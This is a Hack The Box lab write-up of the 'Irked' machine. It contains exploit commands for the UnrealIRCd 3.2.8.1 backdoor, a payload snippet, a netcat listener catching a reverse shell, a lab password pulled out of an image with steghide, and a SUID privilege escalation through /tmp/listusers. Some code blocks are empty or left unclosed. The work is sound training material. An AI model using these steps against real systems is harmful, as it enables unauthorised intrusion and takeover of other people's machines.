### Intro & Enumeration.

As with all guided machines I/we get presented with a set of questions that will **guide** you on your way. It starts with - How many open TCP ports are listening on Irked?  

Starting with **nmap** I scan:

```bash

```

I count 7 ports opening and this was wrong ü§î.

Quick check:

**Nmap categorizes ports into the following states:**

- Open: Open indicates that a service is listening for connections on this port.
- Closed: Closed indicates that the probes were received, but it was concluded that there was no service running on this port.

No, I still count 7 on more scans. Let me check Rustscan for a result:

No, it still counts as 7 and incorrect on input and this is the first question.  

I was going to reach out on HTB Discord about the bug and probably will when I finish the machine.

The only way to do that is answer the question. I suppose this is when the simple power of absolutely winging it happens, so I just guess - the answer was 6 for people scratching their heads.

Moving on the next question is - What software is running on TCP 8067?

Well that‚Äôs in the scan and correct input.

Next question is - In 2010, UnrealIRCd announced there was a backdoor in the software. What version of the software was the backdoor in?

This question is a real guiding question and I‚Äôm glad. The webpage when I landed on it had:

![irked.jpg](irked/Untitled.png)

This tells me IRC isn‚Äôt working but that could also mean it isn‚Äôt working and I could exploit this. The site and guided question help with my decision (:

Back to the question I need a version. Googling helps with this as there are multiple exploits - MSF included that are there due to the keywords in the question - **UnrealIRCd 3.2.8.1 - Backdoor Command Execution (Metasploit)**

That‚Äôs one exploit but I prefer not to use metasploit. That just means look at GitHub for possible exploits. I found a python script [here](https://github.com/Ranger11Danger/UnrealIRCd-3.2.8.1-Backdoor/blob/master/exploit.py) (:

Onto the next question - What two characters are sent as the start of a command trigger passing the command to `system()` and thus execution?

This got me thinking I need to understand the exploit more and that‚Äôs long for a write-up and down to any readers to learn the way it suits them.

However, I got the answer by studying the exploits payload:

```python
<-------------------------------------SNIP------------------------------------->
# all the different payload options to be sent
if args.payload == 'python':
    try:
        s.sendall((f'AB; {gen_payload(python_payload)} \n').encode())
    except:
        print('connection made, but failed to send exploit...')
<-------------------------------------SNIP------------------------------------->
```

So it is pretty easy to see the answer by looking at the payload that has been crafted. It sends **AB**

characters and this is the answer.

Now the fun stuff, I want to see will the exploit work!!

### Exploit for User:

I need two terminals - a listener and one to run the exploit:

```bash
 m0j0@r1s1n ÓÇ∞ ~/HTB/write-ups/irked/UnrealIRCd-3.2.8.1-Backdoor ÓÇ∞ ÓÇ† master ¬± ÓÇ∞ python3 exploit.py -payload bash 10.10.10.117 8067
Exploit sent successfully!
```

I get a good sign and wait:

```bash
m0j0@r1s1n ÓÇ∞ ~/HTB/write-ups/irked ÓÇ∞ ÓÇ† m0j0_development ‚úö ÓÇ∞ rlwrap -cAr nc -lvnp 1234          
listening on [any] 1234 ...
connect to [10.10.14.8] from (UNKNOWN) [10.10.10.117] 38764
bash: cannot set terminal process group (618): Inappropriate ioctl for device
bash: no job control in this shell
ircd@irked:~/Unreal3.2$ id
id
uid=1001(ircd) gid=1001(ircd) groups=1001(ircd)
```

I got a connect back (: 

Note - There is a very easy MSF module for this if you `searchsploit` for it, as mentioned above.

So my shell needs a few command before I move on but I will try out of curiosity the `script` method as it is easier to remember:

```bash
ircd@irked:~/Unreal3.2$ script /dev/null -c bash
script /dev/null -c bash
ircd@irked:~/Unreal3.2$ 
[1]  + 45233 suspended  rlwrap -cAr nc -lvnp 1234
 ‚úò m0j0@r1s1n ÓÇ∞ ~/HTB/write-ups/irked ÓÇ∞ ÓÇ† m0j0_development ‚úö ÓÇ∞ stty raw -echo; fg;             
[1]  + 45233 continued  rlwrap -cAr nc -lvnp 1234
ircd@irked:~/Unreal3.2$ i
id_rsa     irked.jpg
```

Yeah it works also I have auto-complete working as seen above (I think). Anyway‚Ä¶

Time to move on and get user but it appears I need to move onto another user to read `user.txt`

```bash
ircd@irked:/home$ cat djmardov/user.txt
cat djmardov/user.txt
cat: djmardov/user.txt: Permission denied
```

Time for lateral movement to begin, but I also need to check have I missed any guided questions.

The next question is - What is the name of the hidden file that contains a "steg backup pw"?

This is a guide alright let‚Äôs look for a hidden folder, just like enumeration I guess. Right??

So I know all hidden folders start with a period `.` and I am looking a backup. I can try a simple command first.

```bash
ircd@irked:/$ find / -type f -iname ".backup" 2>/dev/null
find / -type f -iname ".backup" 2>/dev/null
/home/djmardov/Documents/.backup
```

Thinking simple can pay off at times (: I got my next answer.

Also in the process I found another file that might help the next question, first can I access backup?

```bash
ircd@irked:/$ cat /home/djmardov/Documents/.backup
cat /home/djmardov/Documents/.backup
Super elite steg backup pw
UPupDOWNdownLRlrBAbaSSss
```

Yes it looks like I can and it has just turned into a CTF with stenography references. I did mention I stumbled on what I think might answer the next question.

What is djmardov's password? 
Searching previously I found a `jpg` called `irked.jpg` so I got to try and see is this the stego.

```bash
ircd@irked:/var/www/html$ ls -la
ls -la
total 48
drwxr-xr-x 2 root root  4096 May 15  2018 .
drwxr-xr-x 3 root root  4096 May 14  2018 ..
-rw-r--r-- 1 root root    72 May 14  2018 index.html
-rw-r--r-- 1 root root 34697 May 14  2018 irked.jpg
```

Initiating a Python server in the directory the `jpg` is in and using **wget** I got this `jpg` local.

```bash
m0j0@r1s1n ÓÇ∞ ~/HTB/write-ups/irked ÓÇ∞ ÓÇ† m0j0_development ‚úö ÓÇ∞ steghide extract -sf 'irked.jpg'
Enter passphrase: 
the file "pass.txt" does already exist. overwrite ? (y/n) y

Kab6h+m+bbp2J:HG
```

Steghide did a good job and got the password, now the big question.  What for?
I need to try SSH.

```bash
m0j0@r1s1n ÓÇ∞ ~/HTB/write-ups/irked ÓÇ∞ ÓÇ† m0j0_development ‚úö ÓÇ∞ ssh djmardov@irked.htb

### Privilege Escalation

OK, time for me personally to go through a set of commands to check if I have any low hanging fruit to get root:

```bash
djmardov@irked:~$ sudo -l                                                                                                                                    
-bash: sudo: command not found

I tried `sudo -l` to check did I have anything I could run as root but as you can see it didn‚Äôt exist.

Then I check for files/binaries that  have any special permissions and this seems to have thrown up a binary that isn‚Äôt standard. Oh the questions, let me check.

What is the filename for the SetUID binary that is custom to Irked?

Look I have a binary called `viewuser` and it answers the question but not the next.

What is the full path of the file that `viewuser` fails to load when it runs?

I need to run it to see:

```bash
djmardov@irked:~$ /usr/bin/viewuser
This application is being devleoped to set and test user permissions
It is still being actively developed
(unknown) :0           2024-01-06 01:01 (:0)
djmardov pts/1        2024-01-06 01:38 (10.10.14.8)
sh: 1: /tmp/listusers: not found
```

It tries to run `/tmp/listusers` and this is my answer and maybe my way to root, let me try and copy the `sh` binary into the non-existent file and see can I get a root shell.

```bash
djmardov@irked:~$ cp /bin/sh /tmp/listusers
djmardov@irked:~$ /usr/bin/viewuser
This application is being devleoped to set and test user permissions

Yeah (: I get a winner.

There you have it root was quite simple following some basic enumeration steps and hacks.

I hope you enjoy the read and take something home from it.
